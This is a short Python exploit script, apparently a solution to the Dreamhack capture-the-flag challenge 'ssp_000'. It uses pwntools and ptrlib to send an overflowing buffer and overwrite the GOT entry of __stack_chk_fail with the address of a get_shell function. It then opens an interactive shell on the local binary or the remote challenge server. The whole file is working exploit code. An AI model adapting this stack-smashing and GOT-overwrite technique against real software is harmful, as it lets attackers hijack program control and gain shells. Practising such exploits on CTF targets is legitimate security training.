#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./ssp_000")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 19950)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    stack_chk_fail_got = unwrap(exe.got("__stack_chk_fail"))
    get_shell = unwrap(exe.symbol("get_shell"))

    io.send(b"A" * 0x80)
    io.sendlineafter(": ", str(stack_chk_fail_got))
    io.sendlineafter(": ", str(get_shell))

    io.interactive()
    return


if __name__ == "__main__":
    main()
